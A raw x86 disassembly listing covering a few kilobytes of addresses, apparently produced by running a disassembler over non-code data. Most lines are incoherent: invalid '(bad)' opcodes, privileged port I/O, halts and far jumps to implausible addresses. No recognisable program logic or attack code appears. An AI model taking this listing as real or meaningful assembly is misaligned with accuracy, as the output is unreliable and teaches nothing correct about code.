  428c96:	imul   edx,DWORD PTR [ecx],0x6b011586
  428c9c:	push   ebp
  428c9d:	mov    esi,?
  428c9f:	and    eax,0xd90bc2a
  428ca4:	int3   
  428ca5:	push   0xba053c8b
  428caa:	pop    edi
  428cab:	leave  
  428cac:	imul   esp,DWORD PTR [eax],0xc
  428caf:	fcomp  DWORD PTR [esi]
  428cb1:	xor    eax,0x83fcdcc4
  428cb6:	sub    al,0xbe
  428cb8:	push   ebx
  428cb9:	shr    BYTE PTR [ecx-0x4e],cl
  428cbc:	inc    ebx
  428cbd:	into   
  428cbe:	out    0x49,eax
  428cc0:	scas   al,BYTE PTR es:[edi]
  428cc1:	popf   
  428cc2:	cs jbe 0x428ced
  428cc5:	repnz sub BYTE PTR [ecx],al
  428cc8:	lods   al,BYTE PTR ds:[esi]
  428cc9:	loope  0x428caa
  428ccb:	adc    al,0x1b
  428ccd:	or     al,0xe6
  428ccf:	cwde   
  428cd0:	in     al,0xdb
  428cd2:	push   0xf6b9da55
  428cd7:	mov    cl,0x2e
  428cd9:	loope  0x428ce6
  428cdb:	rcl    BYTE PTR [ebx+0x78c02e35],0x97
  428ce2:	mov    ebx,0x248a36c3
  428ce7:	xchg   ebx,eax
  428ce8:	repz xchg esi,eax
  428cea:	stos   DWORD PTR es:[edi],eax
  428ceb:	mov    ebx,0x816f5aab
  428cf0:	xchg   edi,eax
  428cf1:	stc    
  428cf2:	xor    cl,bh
  428cf4:	dec    edx
  428cf5:	xor    eax,0xf5a9f2e1
  428cfa:	fidiv  DWORD PTR [esi]
  428cfc:	inc    eax
  428cfd:	jg     0x428cd2
  428cff:	in     eax,dx
  428d00:	ror    BYTE PTR ds:0xe30b3ef5,cl
  428d06:	pop    es
  428d07:	xor    esi,edx
  428d09:	hlt    
  428d0a:	sub    BYTE PTR [ebx+0x1a002645],bl
  428d10:	hlt    
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x2f7e
  428d82:	mov    ebp,0x1b53714
  428d87:	add    BYTE PTR ds:0xb1000001,al
  428d8d:	call   0xdbff6ecb
  428d92:	imul   ecx,DWORD PTR [eax-0x39],0x10a5cd3e
  428d99:	js     0x428d41
  428d9b:	out    dx,eax
  428d9c:	mov    ebp,0x8c42a902
  428da1:	pop    esi
  428da2:	dec    edx
  428da3:	inc    esp
  428da4:	(bad)  ds:0xed63695f
  428daa:	inc    eax
  428dab:	lods   al,BYTE PTR ds:[esi]
  428dac:	and    al,0x9c
  428dae:	sub    ah,dh
  428db0:	jne    0x428e05
  428db2:	mov    ds,WORD PTR [ecx+0x99ddffa]
  428db8:	xchg   ebp,eax
  428db9:	mov    cl,0xe9
  428dbb:	pop    ss
  428dbc:	(bad)  
  428dbe:	xor    DWORD PTR [ecx-0x5133301],ecx
  428dc4:	add    DWORD PTR [edi],esi
  428dc6:	xchg   ecx,eax
  428dc7:	sahf   
  428dc8:	lods   eax,DWORD PTR ds:[esi]
  428dc9:	(bad)  
  428dca:	out    dx,eax
  428dcb:	aad    0x7f
  428dcd:	push   ecx
  428dce:	sub    ecx,esp
  428dd0:	iret   
  428dd1:	and    eax,0x83bb3a0e
  428dd6:	enter  0x3e1d,0x93
  428dda:	mov    ecx,0x6ef2098
  428ddf:	jns    0x428e2b
  428de1:	or     ebp,esi
  428de3:	dec    esi
  428de4:	mov    al,ds:0xd88adbc2
  428de9:	or     al,BYTE PTR [esp+esi*2]
  428dec:	jns    0x428e27
  428dee:	xchg   DWORD PTR [esi+0x7b],ebx
  428df1:	gs in  al,dx
  428df3:	mov    bl,BYTE PTR [eax+0x63f8359f]
  428df9:	mov    al,ds:0xec228ee
  428dfe:	outs   dx,BYTE PTR ds:[esi]
  428dff:	fldenv [ecx]
  428e01:	mov    ds:0xa0949049,eax
  428e06:	daa    
  428e07:	mov    ebx,0xf5be9a9f
  428e0c:	xor    al,0x3c
  428e0e:	jo     0x428e4a
  428e10:	push   ds
  428e11:	push   0x939e65a8
  428e16:	push   ecx
  428e17:	or     al,0x71
  428e19:	cld    
  428e1a:	les    edx,FWORD PTR [esi-0x20]
  428e1d:	scas   al,BYTE PTR es:[edi]
  428e1e:	and    DWORD PTR [edx-0x55],ebp
  428e21:	out    dx,al
  428e22:	xchg   esp,eax
  428e23:	xchg   DWORD PTR [ebx],ecx
  428e25:	ror    BYTE PTR [esi],1
  428e27:	out    0x9f,eax
  428e29:	xchg   BYTE PTR [esi],ch
  428e2b:	adc    al,0x23
  428e2d:	jle    0x428dfe
  428e2f:	cmp    ah,0xd
  428e32:	(bad)  
  428e33:	push   DWORD PTR [ecx]
  428e35:	lahf   
  428e36:	mov    ds:0xbd03bec8,eax
  428e3b:	jp     0x428e56
  428e3d:	cs retf 
  428e3f:	mov    cl,0x6f
  428e41:	xchg   BYTE PTR [edi-0x2b],ah
  428e44:	or     ecx,ecx
  428e46:	ret    
  428e47:	retf   
  428e48:	loope  0x428e0a
  428e4a:	(bad)  
  428e4b:	(bad)  
  428e4c:	xchg   esp,eax
  428e4d:	pop    es
  428e4e:	xor    ebp,esi
  428e50:	rol    DWORD PTR [ebp+0x2edfa841],1
  428e56:	test   DWORD PTR [eax+esi*8+0x4a65cf91],esp
  428e5d:	cmp    eax,0x4db2921a
  428e62:	xlat   BYTE PTR ds:[ebx]
  428e63:	inc    ecx
  428e64:	push   eax
  428e65:	repnz push esp
  428e67:	call   0x4b74a522
  428e6c:	scas   al,BYTE PTR es:[edi]
  428e6d:	lods   al,BYTE PTR ds:[esi]
  428e6e:	push   0x4532cd7
  428e73:	aad    0xb
  428e75:	lahf   
  428e76:	test   BYTE PTR [ebp-0x4a],bh
  428e79:	xor    BYTE PTR [ecx],cl
  428e7b:	sbb    DWORD PTR [ebx],esi
  428e7d:	daa    
  428e7e:	fwait
  428e7f:	push   eax
  428e80:	out    dx,eax
  428e81:	xor    BYTE PTR [eax],cl
  428e83:	fstp   QWORD PTR [ecx]
  428e85:	ins    DWORD PTR es:[edi],dx
  428e86:	cmc    
  428e87:	xchg   ebx,eax
  428e88:	data16 loope 0x428f01
  428e8b:	retf   
  428e8c:	mov    DWORD PTR [eax+edx*1+0xe],edx
  428e90:	ins    BYTE PTR es:[edi],dx
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xc5
  428f01:	(bad)  
  428f02:	and    eax,DWORD PTR [edi]
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x9b000001
  428f0d:	push   0x65870f10
  428f12:	xor    al,0xfa
  428f14:	loope  0x428eba
  428f16:	mov    ah,0xf1
  428f18:	xchg   esp,eax
  428f19:	dec    ebp
  428f1a:	mov    bl,0x56
  428f1c:	xchg   edi,eax
  428f1d:	xchg   esp,eax
  428f1e:	mov    ch,dl
  428f20:	sbb    eax,0x5ce43614
  428f25:	push   cs
  428f26:	leave  
  428f27:	rcr    DWORD PTR [edx],1
  428f29:	popf   
  428f2a:	pop    edi
  428f2b:	jge    0x428f3f
  428f2d:	xor    dh,0xac
  428f30:	ds popa 
  428f32:	jl     0x428f5f
  428f34:	popa   
  428f35:	sbb    dh,BYTE PTR [ebx+ebx*8]
  428f38:	(bad)  
  428f39:	fadd   QWORD PTR [eax]
  428f3b:	push   ds
  428f3c:	ins    BYTE PTR es:[edi],dx
  428f3d:	mov    edi,0x15688695
  428f42:	mov    bh,0x53
  428f44:	sub    ah,BYTE PTR es:[edi+0x63]
  428f48:	fwait
  428f49:	sub    ebp,DWORD PTR [ecx+eax*2+0x3a]
  428f4d:	pushf  
  428f4e:	test   al,0x36
  428f50:	into   
  428f51:	stc    
  428f52:	fs jo  0x428f93
  428f55:	mov    eax,0xd47551e7
  428f5a:	pushf  
  428f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f5c:	test   BYTE PTR [ebp+0xf5bb6e7],bl
  428f62:	cmp    ch,BYTE PTR [eax+0x44]
  428f65:	fcomp  DWORD PTR [esi]
  428f67:	xchg   edx,eax
  428f68:	jbe    0x428f8d
  428f6a:	push   edi
  428f6b:	add    BYTE PTR [ebp-0x61],ch
  428f6e:	pop    eax
  428f6f:	pusha  
  428f70:	mov    bl,0xaa
  428f72:	mov    dh,dh
  428f74:	cwde   
  428f75:	xor    BYTE PTR [esi-0x5d],ah
  428f78:	pusha  
  428f79:	stos   DWORD PTR es:[edi],eax
  428f7a:	jb     0x428f92
  428f7c:	sub    edx,0x28
  428f7f:	out    dx,al
  428f80:	xchg   esi,eax
  428f81:	push   cs
  428f82:	out    0x4f,eax
  428f84:	pop    es
  428f85:	dec    esi
  428f86:	leave  
  428f87:	std    
  428f88:	jns    0x428fc0
  428f8a:	subps  xmm3,XMMWORD PTR [edi+0x41dc6cc5]
  428f91:	stos   BYTE PTR es:[edi],al
  428f92:	jne    0x428fd7
  428f94:	pop    edx
  428f95:	xchg   edx,eax
  428f96:	fisub  DWORD PTR ds:[esi+esi*2+0x2c]
  428f9b:	jmp    0x428fba
  428f9d:	cmp    ebp,DWORD PTR [esi+ebx*2+0x188ec5b4]
  428fa4:	and    ch,al
  428fa6:	mov    esp,0x904b858a
  428fab:	pushf  
  428fac:	in     eax,dx
  428fad:	cmp    BYTE PTR [ecx-0x2f],0x49
  428fb1:	ins    DWORD PTR es:[edi],dx
  428fb2:	mov    es,eax
  428fb4:	mov    bl,0xba
  428fb6:	cdq    
  428fb7:	jl     0x428fb9
  428fb9:	mov    ecx,0x7466d439
  428fbe:	sub    al,0x6a
  428fc0:	jle    0x428f55
  428fc2:	shl    BYTE PTR [ebp+0x2f46bc7c],cl
  428fc8:	arpl   WORD PTR [edi+0x51],sp
  428fcb:	cmp    dl,ah
  428fcd:	arpl   WORD PTR [ebp+0x5a],si
  428fd0:	aaa    
  428fd1:	sbb    DWORD PTR [ebx-0x213ff7d7],ecx
  428fd7:	pop    esi
  428fd8:	rol    WORD PTR [edx-0x5a],0x8c
  428fdd:	sahf   
  428fde:	out    dx,al
  428fdf:	mov    cl,0x4d
  428fe1:	xor    bl,ah
  428fe3:	adc    DWORD PTR [ebx],ebx
  428fe5:	push   0xdfdd4df8
  428fea:	xchg   ebp,eax
  428feb:	ins    BYTE PTR es:[edi],dx
  428fec:	pop    ss
  428fed:	lock or eax,0xa0986dad
  428ff3:	and    al,0xcb
  428ff5:	mov    ds:0xe5f339fd,eax
  428ffa:	adc    ah,BYTE PTR [edi-0x38]
  428ffd:	sub    DWORD PTR [ecx],edi
  428fff:	adc    ecx,DWORD PTR [edi+edi*8-0x58]
  429003:	test   al,0x87
  429005:	sahf   
  429006:	adc    ebx,DWORD PTR [edx]
  429008:	mov    cl,0xb0
  42900a:	out    dx,al
  42900b:	retf   0xb0f3
  42900e:	and    DWORD PTR [ebx+0x3e],edi
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x46fc7b77
  429081:	inc    esp
  429082:	push   ebx
  429083:	cmovno esi,DWORD PTR [edi+0x1050001]
  42908a:	add    BYTE PTR [eax],al
  42908c:	xchg   DWORD PTR [edx-0x42],eax
  42908f:	and    edx,DWORD PTR [ebx-0x39]
  429092:	popf   
  429093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429094:	loope  0x4290c9
  429096:	fnstcw WORD PTR [edi]
  429098:	popf   
  429099:	test   al,0x23
  42909b:	jmp    0x2d4679c
  4290a0:	lods   eax,DWORD PTR ds:[esi]
  4290a1:	sub    al,0x15
  4290a3:	xchg   BYTE PTR [edi],ah
  4290a5:	mov    dl,0xd4
  4290a7:	dec    ebp
  4290a8:	and    BYTE PTR [esi-0x7],al
  4290ab:	hlt    
  4290ac:	mov    eax,ds:0x24d5d95c
  4290b1:	aad    0x61
  4290b3:	mov    edi,0xad5f9db6
  4290b8:	mov    al,0xaf
  4290ba:	js     0x429076
  4290bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290bd:	xlat   BYTE PTR ds:[ebx]
  4290be:	push   esi
  4290bf:	cwde   
  4290c0:	push   edi
  4290c1:	pop    ebp
  4290c2:	or     BYTE PTR fs:[edi+0x53],bh
  4290c6:	data16 add al,0xc5
  4290c9:	sahf   
  4290ca:	pop    esi
  4290cb:	in     eax,dx
  4290cc:	inc    edx
  4290cd:	sbb    eax,0x29f8446b
  4290d2:	mov    ds:0x873131ed,eax
  4290d7:	icebp  
  4290d8:	or     al,cl
  4290da:	inc    edx
  4290db:	rcr    DWORD PTR [edi-0x10a0c30b],1
  4290e1:	fild   DWORD PTR [esi]
  4290e3:	fcomi  st,st(4)
  4290e5:	or     BYTE PTR [edi],ah
  4290e7:	out    0x5,eax
  4290e9:	push   ecx
  4290ea:	sti    
  4290eb:	das    
  4290ec:	ins    DWORD PTR es:[edi],dx
  4290ed:	popf   
  4290ee:	sbb    edi,edx
  4290f0:	dec    ebx
  4290f1:	or     eax,0x3f905fa4
  4290f6:	mov    ecx,0xa62c1c0d
  4290fb:	push   esi
  4290fc:	and    eax,DWORD PTR [ecx+ebp*1+0x56]
  429100:	jecxz  0x4290b6
  429102:	adc    dh,ah
  429104:	fidivr DWORD PTR [ecx-0x21086e98]
  42910a:	pop    eax
  42910b:	jl     0x4290d8
  42910d:	xchg   BYTE PTR [ebp+ecx*8-0x33],bh
  429111:	sbb    al,0xe1
  429113:	(bad)  
  429114:	xchg   ecx,eax
  429115:	icebp  
  429116:	xchg   esp,eax
  429117:	jnp    0x4290b3
  429119:	sahf   
  42911a:	jge    0x429115
  42911c:	sbb    DWORD PTR [esi+0x74],ebx
  42911f:	test   al,0x10
  429121:	addr16 push cs
  429123:	jbe    0x42917c
  429125:	sbb    ebx,DWORD PTR [edi]
  429127:	and    bh,BYTE PTR [ebx+0x4f]
  42912a:	(bad)
  42912d:	cmp    DWORD PTR [edi+ebx*4],ecx
  429130:	xchg   ecx,eax
  429131:	push   0xffffffe0
  429133:	out    dx,eax
  429134:	aam    0xfe
  429136:	or     DWORD PTR [esi+0x512bf4d],edx
  42913c:	loop   0x4290ee
  42913e:	inc    ecx
  42913f:	mov    cl,BYTE PTR [edi]
  429141:	test   DWORD PTR [edx],ebx
  429143:	pop    edi
  429144:	xchg   esi,eax
  429145:	mov    dl,0x32
  429147:	mov    dl,0x89
  429149:	xor    esi,edx
  42914b:	xchg   BYTE PTR [ecx],bl
  42914d:	ins    DWORD PTR es:[edi],dx
  42914e:	xlat   BYTE PTR ds:[ebx]
  42914f:	mov    ebx,DWORD PTR [ebx+ebx*1]
  429152:	push   ss
  429153:	lods   al,BYTE PTR ds:[esi]
  429154:	mov    al,0x18
  429156:	test   bh,0x39
  429159:	pop    esp
  42915a:	scas   al,BYTE PTR es:[edi]
  42915b:	dec    edx
  42915c:	dec    ebp
  42915d:	sub    eax,0xf1646996
  429162:	sub    dh,BYTE PTR [ebx+0x35]
  429165:	add    BYTE PTR [esp+ebx*4+0x5f955d2e],al
  42916c:	inc    ebx
  42916d:	cmp    BYTE PTR [ecx],bl
  42916f:	sahf   
  429170:	push   eax
  429171:	cmp    al,BYTE PTR [ebp-0x764ffced]
  429177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429178:	jmp    0x8dc0f43d
  42917d:	les    ecx,FWORD PTR [ebx]
  42917f:	outs   dx,DWORD PTR ds:[esi]
  429180:	nop
  429181:	pop    esp
  429182:	sbb    bh,BYTE PTR [ebx]
  429184:	adc    edx,DWORD PTR [ecx+0x4cb5c586]
  42918a:	(bad)  
  42918b:	mov    esi,0x736c6e6d
  429190:	mov    esi,0x0
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edi+edx*4+0x463f0837],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [edx+0x5f],bl
  42920e:	mov    ah,0x46
  429210:	sub    ebp,ebx
  429212:	hlt    
  429213:	fnstsw WORD PTR [edi-0x7d]
  429216:	cdq    
  429217:	mov    bl,0x0
  429219:	(bad)  
  42921a:	loop   0x4291ff
  42921c:	jbe    0x429266
  42921e:	jl     0x429225
  429220:	(bad)
  429223:	xor    cl,BYTE PTR [edi-0x13]
  429226:	push   0x81964ae8
  42922b:	push   esp
  42922c:	fcom   DWORD PTR [ecx]
  42922e:	sbb    ah,BYTE PTR [esi+ecx*4]
  429231:	inc    edi
  429232:	pop    es
  429233:	mov    ds:0x68501c3,eax
  429238:	and    eax,0xa27b3060
  42923d:	and    BYTE PTR [eax-0x708e902],cl
  429243:	jmp    0xad06405b
  429248:	dec    ebx
  429249:	in     eax,0x3d
  42924b:	or     eax,0x72500555
  429250:	inc    edi
  429251:	sub    bh,cl
  429253:	and    al,BYTE PTR [ecx+ebp*4+0x77]
  429257:	stos   DWORD PTR es:[edi],eax
  429258:	mov    es,WORD PTR [esi]
  42925a:	xor    ebp,eax
  42925c:	outs   dx,BYTE PTR ds:[esi]
  42925d:	xchg   ecx,eax
  42925e:	push   ds
  42925f:	jae    0x42928c
  429261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429262:	stos   DWORD PTR es:[edi],eax
  429263:	retf   0xe69d
  429266:	dec    esp
  429267:	xchg   ebp,eax
  429268:	push   ebx
  429269:	push   ebp
  42926a:	in     al,0x64
  42926c:	shr    esi,1
  42926e:	popa   
  42926f:	gs lock or al,0xd0
  429273:	jo     0x429237
  429275:	sar    BYTE PTR [esi+edx*8],cl
  429278:	add    BYTE PTR cs:[eax+eiz*1+0x7eac7d98],bh
  429280:	aam    0xd7
  429282:	aas    
  429283:	mov    ebx,0xf68c536a
  429288:	push   edx
  429289:	mov    eax,ds:0xdc1a3011
  42928e:	jno    0x4292fc
  429290:	ja     0x4292c5
  429292:	fdivr  QWORD PTR [ecx-0x419a2384]
  429298:	repz aaa 
  42929a:	sbb    edi,DWORD PTR ds:0x4fc74a6c
  4292a0:	jmp    0x9e06:0x335bb5fe
  4292a7:	dec    edi
  4292a8:	bound  esp,QWORD PTR [esi-0x64634466]
  4292ae:	dec    eax
  4292af:	ror    BYTE PTR [ebx+0x1],1
  4292b2:	push   ecx
  4292b3:	enter  0x9b5a,0xb7
  4292b7:	cmp    al,0xb1
  4292b9:	test   al,0x3
  4292bb:	cmp    dh,BYTE PTR [eax]
  4292bd:	imul   edi,DWORD PTR [edi-0x4b],0x449d4435
  4292c4:	test   BYTE PTR [ebx],dh
  4292c6:	xor    edx,edx
  4292c8:	mov    eax,ds:0xa915b3fd
  4292cd:	mov    edi,0x80478dd9
  4292d2:	xchg   esi,eax
  4292d3:	mov    ds:0x98320957,eax
  4292d8:	sub    BYTE PTR [ecx],bl
  4292da:	jns    0x42931d
  4292dc:	jmp    0xa97c4cb6
  4292e1:	ja     0x42931b
  4292e3:	jge    0x4292ee
  4292e5:	jecxz  0x42928d
  4292e7:	iret   
  4292e8:	popf   
  4292e9:	jne    0x42927d
  4292eb:	arpl   WORD PTR ds:0xed4e7da3,sp
  4292f1:	sbb    DWORD PTR [edi-0x25],edx
  4292f4:	(bad)  
  4292f5:	mov    bl,0x6c
  4292f7:	push   ebp
  4292f8:	push   ecx
  4292f9:	loopne 0x42930f
  4292fb:	sahf   
  4292fc:	add    bl,BYTE PTR [ecx+0x55]
  4292ff:	and    DWORD PTR [ebx],esp
  429301:	ror    BYTE PTR [ecx+0x5a],1
  429304:	push   ds
  429305:	mov    esp,DWORD PTR [edi]
  429307:	xchg   ebp,eax
  429308:	fild   QWORD PTR [ebx-0x34a4e064]
  42930e:	mov    edi,DWORD PTR [ecx-0xb]
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xf2
  429381:	out    dx,eax
  429382:	ror    edx,1
  429384:	dec    ebx
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	shr    DWORD PTR [edi-0x18],1
  42938f:	adc    DWORD PTR [ecx],edi
  429391:	loope  0x429386
  429393:	das    
  429394:	pop    ds
  429395:	push   es
  429396:	clc    
  429397:	enter  0xbc6e,0xc3
  42939b:	cdq    
  42939c:	test   eax,0x10835b32
  4293a1:	call   0x1eb6:0x7bc9cdad
  4293a8:	add    esi,edi
  4293aa:	jns    0x429401
  4293ac:	xchg   ecx,eax
  4293ad:	test   bh,0x74
  4293b0:	test   eax,0x7e43e1
  4293b5:	lock sbb ch,BYTE PTR [ebx-0x3c69ea82]
  4293bc:	enter  0x233,0xf7
  4293c0:	and    al,dh
  4293c2:	popa   
  4293c3:	outs   dx,DWORD PTR ds:[esi]
  4293c4:	loope  0x429414
  4293c6:	xchg   ebx,eax
  4293c7:	cmc    
  4293c8:	pop    ecx
  4293c9:	and    eax,DWORD PTR [eiz*2+0x2b21e4b]
  4293d0:	pop    edx
  4293d1:	mov    DWORD PTR [ecx-0x53613dad],edi
  4293d7:	dec    ebp
  4293d8:	ret    0xac07
  4293db:	mov    esi,0x2c50d286
  4293e0:	or     cl,BYTE PTR ds:0x4821e7f2
  4293e6:	mov    ch,0xdf
  4293e8:	cmc    
  4293e9:	inc    ebp
  4293ea:	div    ebp
  4293ec:	xchg   ebx,eax
  4293ed:	scas   al,BYTE PTR es:[edi]
  4293ee:	outs   dx,DWORD PTR ds:[esi]
  4293ef:	mov    ebp,0x41021060
  4293f4:	push   es
  4293f5:	(bad)  
  4293f6:	loope  0x4293d0
  4293f8:	rcl    DWORD PTR [ebp+0x31],1
  4293fb:	imul   esi,ebx,0xffffffa5
  4293fe:	repnz xchg esp,eax
  429400:	stc    
  429401:	sbb    BYTE PTR ds:0xd0f5419b,0xe2
  429408:	daa    
  429409:	cmp    al,0x6f
  42940b:	call   0xca73:0x8b41cd89
  429412:	fs std 
  429414:	jo     0x42941b
  429416:	bound  edx,QWORD PTR [edi+0x16]
  429419:	mov    WORD PTR [esi-0x31],cs
  42941c:	mov    ecx,DWORD PTR [esi]
  42941e:	or     DWORD PTR [esi-0x68],0xc881c8ab
  429425:	cmp    BYTE PTR [eax-0x55],ah
  429428:	adc    eax,0x3c20d614
  42942d:	ds in  al,0x6c
  429430:	js     0x42949f
  429432:	add    esp,edx
  429434:	jnp    0x429406
  429436:	setbe  al
  429439:	mov    edi,0xb99376f6
  42943e:	outs   dx,BYTE PTR ds:[esi]
  42943f:	adc    BYTE PTR [eax],al
  429441:	and    esi,DWORD PTR [eax-0x18401b5e]
  429447:	pop    ss
  429448:	lods   eax,DWORD PTR ds:[esi]
  429449:	mov    ah,0x84
  42944b:	lea    ecx,[esi]
  42944d:	ins    BYTE PTR es:[edi],dx
  42944e:	in     al,0x56
  429450:	adc    DWORD PTR [edx-0x2e],esp
  429453:	pop    eax
  429454:	jge    0x4294b8
  429456:	jge    0x4294b2
  429458:	ss popf 
  42945a:	aad    0xbd
  42945c:	fs sub al,0x7a
  42945f:	push   ebp
  429460:	(bad)  
  429461:	mov    bh,0x7d
  429463:	ret    0x12a4
  429466:	jge    0x42947e
  429468:	retf   
  429469:	pop    ebp
  42946a:	jmp    0x1059cd21
  42946f:	pushf  
  429470:	(bad)  [ebx]
  429472:	repnz push edi
  429474:	mov    dh,0xcb
  429476:	jge    0x429492
  429478:	adc    al,0x94
  42947a:	push   cs
  42947b:	mov    ch,BYTE PTR [esi-0x32]
  42947e:	hlt    
  42947f:	mov    ebp,0x50dae0e1
  429484:	out    0xc2,eax
  429486:	lds    edx,FWORD PTR [ebx-0x6a]
  429489:	xchg   edi,eax
  42948a:	cmp    DWORD PTR [edi+0x3af01de0],esi
  429490:	nop
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x39542316],dx
  429503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	add    esi,ecx
  42950e:	sbb    al,0x3e
  429510:	mov    ecx,0x8daee8b5
  429515:	loopne 0x42952e
  429517:	pop    ds
  429518:	jg     0x429567
  42951a:	leave  
  42951b:	cli    
  42951c:	mov    cl,0x83
  42951e:	jl     0xe2dcaf52
  429524:	pop    ds
  429525:	jb     0x42954a
  429527:	sar    BYTE PTR [bx+si],0xa1
  42952b:	adc    dl,BYTE PTR [edi-0x5f]
  42952e:	dec    eax
  42952f:	push   esi
  429530:	push   ebx
  429531:	into   
  429532:	ins    DWORD PTR es:[edi],dx
  429533:	ds push esi
  429535:	pop    ebp
  429536:	add    BYTE PTR [ebx-0x589264f5],0x22
  42953d:	and    al,0xdc
  42953f:	sahf   
  429540:	jnp    0x42951e
  429542:	popf   
  429543:	mov    esp,0xf581e050
  429548:	cmp    esi,esi
  42954a:	(bad)  
  42954b:	sub    DWORD PTR [ebx-0x64],ebp
  42954e:	push   ss
  42954f:	test   BYTE PTR [ebp+0xa],ah
  429552:	sti    
  429553:	jmp    0x5a56:0xaa377d99
  42955a:	stos   DWORD PTR es:[edi],eax
  42955b:	jae    0x4295c3
  42955d:	inc    esp
  42955e:	ins    DWORD PTR es:[edi],dx
  42955f:	rcr    DWORD PTR [ebx+0x66],0xe6
  429563:	fiadd  DWORD PTR [edx-0x2019043]
  429569:	lahf   
  42956a:	call   0xd441:0x855a8f33
  429571:	mov    al,0x8d
  429573:	pop    eax
  429574:	sub    ebp,DWORD PTR [ebp+0x1973a54]
  42957a:	cmp    edi,ebp
  42957c:	pop    ebp
  42957d:	stos   DWORD PTR es:[edi],eax
  42957e:	push   ds
  42957f:	mov    bh,0x8a
  429581:	mov    edx,0xcfd7dbe
  429586:	packssdw mm3,QWORD PTR [edx+0x5f4d744f]
  42958d:	and    bh,BYTE PTR [eax]
  42958f:	lods   al,BYTE PTR gs:[esi]
  429591:	das    
  429592:	jno    0x429580
  429594:	lds    esp,FWORD PTR [edx-0x50]
  429597:	push   0xac679dfc
  42959c:	and    DWORD PTR [edi-0x6e],edi
  42959f:	and    ah,bl
  4295a1:	arpl   WORD PTR [edi-0x5038f01a],sp
  4295a7:	xor    esi,DWORD PTR [edi]
  4295a9:	add    ch,bh
  4295ab:	push   0xf
  4295ad:	sar    DWORD PTR [esi-0x334c4e5c],1
  4295b3:	or     ch,al
  4295b5:	stos   DWORD PTR es:[edi],eax
  4295b6:	aam    0x2a
  4295b8:	xor    DWORD PTR [ebx+0x12],0x0
  4295bc:	xchg   edx,eax
  4295bd:	push   0x47d7e05f
  4295c2:	xor    bl,BYTE PTR [eax-0x41]
  4295c5:	dec    edi
  4295c6:	inc    ebp
  4295c7:	adc    ecx,DWORD PTR ds:[esi]
  4295ca:	test   BYTE PTR [edi-0x3f0eb4ad],0xec
  4295d1:	int3   
  4295d2:	jp     0x42961b
  4295d4:	cmp    eax,esi
  4295d6:	jns    0x42961f
  4295d8:	mov    ebp,0xadb0e45f
  4295dd:	pop    ds
  4295de:	sub    bl,BYTE PTR [ecx+0x2]
  4295e1:	xchg   esp,eax
  4295e2:	lds    eax,FWORD PTR [edi-0x57]
  4295e5:	fidivr WORD PTR [esi+0x28384cea]
  4295eb:	jns    0x42960c
  4295ed:	sub    al,0x58
  4295ef:	rcl    ecx,1
  4295f1:	mov    esi,0x5f4c2b2f
  4295f6:	and    ch,BYTE PTR [ebp-0x1290e552]
  4295fc:	lods   eax,DWORD PTR ds:[esi]
  4295fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295fe:	int    0x2a
  429600:	shl    BYTE PTR [eax],0xf9
  429603:	cld    
  429604:	add    al,ch
  429606:	push   0x70
  429608:	ret    
  429609:	or     DWORD PTR [edx-0x627c4e05],edx
  42960f:	and    eax,0x12
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	dec    BYTE PTR [ecx-0x44aa2d93]
  429686:	add    DWORD PTR [eax],eax
  429688:	add    eax,0x99000001
  42968d:	jle    0x4296c0
  42968f:	mov    eax,0x4fd6edb9
  429694:	sbb    eax,0x90f6465f
  429699:	push   cs
  42969a:	inc    ebp
  42969b:	shr    BYTE PTR [ebx+0x49ed978a],1
  4296a1:	loop   0x429682
  4296a3:	adc    ebp,DWORD PTR [ebx+ebx*8-0x5923db70]
  4296aa:	jle    0x429648
  4296ac:	outs   dx,BYTE PTR ds:[esi]
  4296ad:	cmp    edi,DWORD PTR [esi+0x5f]
  4296b0:	call   0x5382:0x88eb46e4
  4296b7:	push   eax
  4296b8:	jno    0x42963f
  4296ba:	jg     0x429736
  4296bc:	lahf   
  4296bd:	rol    DWORD PTR [eax-0x7c6a2139],0x31
  4296c4:	xchg   esi,eax
  4296c5:	or     ecx,ebp
  4296c7:	xchg   esi,eax
